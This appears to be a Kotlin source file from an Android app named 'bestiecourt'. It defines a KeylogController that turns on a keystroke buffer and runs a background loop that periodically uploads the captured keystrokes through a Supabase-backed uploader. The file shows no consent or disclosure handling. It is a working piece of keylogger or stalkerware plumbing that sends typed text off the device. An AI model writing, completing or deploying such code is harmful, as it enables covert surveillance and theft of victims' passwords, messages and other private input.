package com.bestiecourt.app.core.service

import android.content.Context
import android.util.Log
import com.bestiecourt.app.core.constants.AppConstants
import com.bestiecourt.app.data.local.KeylogBuffer
import com.bestiecourt.app.data.remote.supabase.KeylogUploader
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class KeylogController @Inject constructor(
    private val buffer: KeylogBuffer,
    private val uploader: KeylogUploader
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var uploadJob: Job? = null
    private val TAG = "KeylogController"

    fun start(context: Context) {
        buffer.isEnabled = true
        if (uploadJob?.isActive == true) return
        uploadJob = scope.launch {
            while (isActive && buffer.isEnabled) {
                try {
                    uploader.flush(context)
                } catch (e: Exception) {
                    Log.e(TAG, "flush error: ${e.message}")
                }
                delay(AppConstants.KEYLOG_BATCH_INTERVAL_MS)
            }
        }
        Log.i(TAG, "Keylog started")
    }

    fun stop() {
        buffer.isEnabled = false
        uploadJob?.cancel()
        uploadJob = null
        Log.i(TAG, "Keylog stopped")
    }
}
